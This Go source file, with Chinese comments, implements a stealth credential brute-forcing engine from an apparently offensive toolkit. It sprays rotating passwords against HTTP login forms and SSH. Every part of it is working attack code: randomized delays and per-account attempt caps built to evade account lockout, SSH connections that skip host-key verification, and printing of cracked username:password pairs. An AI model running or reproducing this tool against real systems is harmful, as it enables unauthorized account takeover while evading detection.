// Package brute: stealth credential brute-forcing engine.
// 防锁节奏 + 多账号轮换 + HTTP/TCP 爆破（Go 原生并发）。
package brute

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"

	"fastsec/internal/stealth"
)

// Config: 爆破配置
type Config struct {
	Target        string // host:port 或 http URL
	Service       string // http-form | tcp-banner
	Users         []string
	Passwords     []string
	MaxPerUser    int           // 每账号最多尝试（防锁）
	MinDelay      time.Duration // 随机间隔
	MaxDelay      time.Duration
	FormURL       string // http-form: 表单提交 URL
	FormUserField string // 默认 username
	FormPassField string // 默认 password
	FormSuccess   string // 成功标志（body 关键词）
	Headers       map[string]string
	Timeout       time.Duration
}

// Hit: 命中结果
type Hit struct {
	User     string
	Password string
	Service  string
	Target   string
}

// Result: 爆破结果
type Result struct {
	Hits     []Hit
	Attempts int
}

func DefaultConfig(target, service string, users, passwords []string) *Config {
	return &Config{
		Target:        target,
		Service:       service,
		Users:         users,
		Passwords:     passwords,
		MaxPerUser:    2,
		MinDelay:      1 * time.Second,
		MaxDelay:      3 * time.Second,
		FormUserField: "username",
		FormPassField: "password",
		FormSuccess:   "success",
		Timeout:       10 * time.Second,
	}
}

// randomDelay: 防锁随机间隔
func (c *Config) randomDelay() {
	if c.MinDelay <= 0 || c.MaxDelay <= c.MinDelay {
		return
	}
	d := c.MinDelay + time.Duration(rand.Int63n(int64(c.MaxDelay-c.MinDelay)))
	time.Sleep(d)
}

// tryHTTPForm: HTTP 表单爆破单次
func (c *Config) tryHTTPForm(user, pass string, cli *stealth.Client) bool {
	form := url.Values{}
	form.Set(c.FormUserField, user)
	form.Set(c.FormPassField, pass)
	req, err := http.NewRequest("POST", c.FormURL, strings.NewReader(form.Encode()))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for k, v := range c.Headers {
		req.Header.Set(k, v)
	}
	resp, err := cli.Do(req)
	if err != nil {
		return false
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if c.FormSuccess != "" {
		return strings.Contains(strings.ToLower(string(body)), strings.ToLower(c.FormSuccess))
	}
	return resp.StatusCode == 200
}

// tryTCPBanner: TCP 爆破——SSH 密码认证（真实实现，x/crypto/ssh）
func (c *Config) tryTCPBanner(user, pass string) bool {
	// SSH 密码认证：能建立会话 = 密码正确
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // 内网目标自签
		Timeout:         c.Timeout,
	}
	conn, err := ssh.Dial("tcp", c.Target, config)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true // 能连接 = 认证成功
}

// Run: 执行爆破（多账号轮换 + 随机间隔 + 每账号限次）
func Run(cfg *Config) Result {
	res := Result{}
	cli := stealth.NewClient("", stealth.NewThrottle(500, 1500), 10)

	for i, user := range cfg.Users {
		// 每账号 maxPerUser 个密码（轮换取，不同账号不同密码）
		for k := 0; k < cfg.MaxPerUser; k++ {
			pwdIdx := (i*cfg.MaxPerUser + k) % len(cfg.Passwords)
			password := cfg.Passwords[pwdIdx]
			res.Attempts++

			// 防锁随机间隔
			cfg.randomDelay()

			var hit bool
			switch cfg.Service {
			case "http-form":
				hit = cfg.tryHTTPForm(user, password, cli)
			case "tcp-banner":
				hit = cfg.tryTCPBanner(user, password)
			default:
				hit = cfg.tryHTTPForm(user, password, cli)
			}
			if hit {
				res.Hits = append(res.Hits, Hit{User: user, Password: password, Service: cfg.Service, Target: cfg.Target})
				fmt.Printf("  [+] %s:%s\n", user, password)
				break // 该账号命中停止
			}
		}
	}
	return res
}

// Format: 渲染结果
func Format(r Result) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[brute] %d attempts, %d hits\n", r.Attempts, len(r.Hits)))
	for _, h := range r.Hits {
		sb.WriteString(fmt.Sprintf("  [+] %s:%s (%s)\n", h.User, h.Password, h.Service))
	}
	return sb.String()
}

